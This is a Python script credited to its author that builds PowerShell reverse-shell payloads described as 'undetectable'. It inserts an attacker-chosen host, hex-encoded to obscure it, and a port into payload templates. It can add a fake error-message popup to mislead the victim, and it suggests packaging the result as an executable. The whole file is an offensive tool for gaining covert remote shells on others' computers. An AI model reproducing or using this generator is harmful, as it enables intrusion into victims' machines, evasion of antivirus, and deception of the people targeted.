import os

os.system("cls||clear")
print("created by NiekGevers")
print("1. powershell reverse shell-small")
print("2. powershell reverse shell-big")
question = input("choose your undetectable payload 1/2 => ")
if question == ("1"):
  lhost = input("LHOST => ")
  lport = input("LPORT => ")
  def ip2hex(ip):
      return "0x" + "".join(map(lambda i: "{:02X}".format(int(i)), ip.split(".")))
  if __name__ == '__main__':
      lhost_hex = ip2hex(lhost)  
  rev_small = open("payloads/powershell-reverse-shell-small.ps1", "rt")
  output = open("payload.ps1", "wt")
  for line in rev_small:
    output.write(line.replace("{lhost}", lhost_hex).replace("{lport}", lport))
  rev_small.close()
  output.close()
  fake_error_msg = input("Do you want to add a custom fake error message to the payload? yes/no => ")
  if fake_error_msg == ("yes"):
    msg_title = input("Error message title => ")
    msg_body = input("Error message body => ")
    msg_content = "Add-Type -AssemblyName PresentationFramework ; [System.Windows.MessageBox]::Show('{}','{}','ok','Error')".format(msg_body, msg_title)
    with open("payload.ps1", 'r+') as fp:
      lines = fp.readlines()
      lines.insert(0, msg_content)
      fp.seek(0)
      fp.writelines(lines)
  elif fake_error_msg == ("no"):
    pass
  else:
    print("please type yes or no")
  print("[+] payload generated as payload.ps1")
  print("[*] now you can convert your payload.ps1 to an executable with ps2exe on windows. (more likely to get detected by antivirus!)")
elif question == ("2"):
  lhost_big = input("LHOST => ")
  lport_big = input("LPORT => ")
  def ip2hex_big(ip):
      return "0x" + "".join(map(lambda i: "{:02X}".format(int(i)), ip.split(".")))
  if __name__ == '__main__':
      lhost_big_hex = ip2hex_big(lhost_big)  
  rev_big = open("payloads/powershell-reverse-shell-big.ps1", "rt")
  output_big = open("payload_big.ps1", "wt")
  for line in rev_big:
    output_big.write(line.replace("{lhost}", lhost_big_hex).replace("{lport}", lport_big))
  rev_big.close()
  output_big.close()
  fake_error_msg_big = input("Do you want to add a custom fake error message to the payload? yes/no => ")
  if fake_error_msg_big == ("yes"):
    msg_title_big = input("Error message title => ")
    msg_body_big = input("Error message body => ")
    msg_content_big = "Add-Type -AssemblyName PresentationFramework ; [System.Windows.MessageBox]::Show('{}','{}','ok','Error')".format(msg_body_big, msg_title_big)
    with open("payload_big.ps1", 'r+') as fp:
      lines = fp.readlines()
      lines.insert(0, msg_content_big)
      fp.seek(0)
      fp.writelines(lines)
  elif fake_error_msg_big == ("no"):
    pass
  else:
    print("please type yes or no")
  print("[+] payload generated as payload_big.ps1")
  print("[*] now you can convert your payload.ps1 to an executable with ps2exe on windows. (more likely to get detected by antivirus!)")
else:
  print("please type 1 or 2")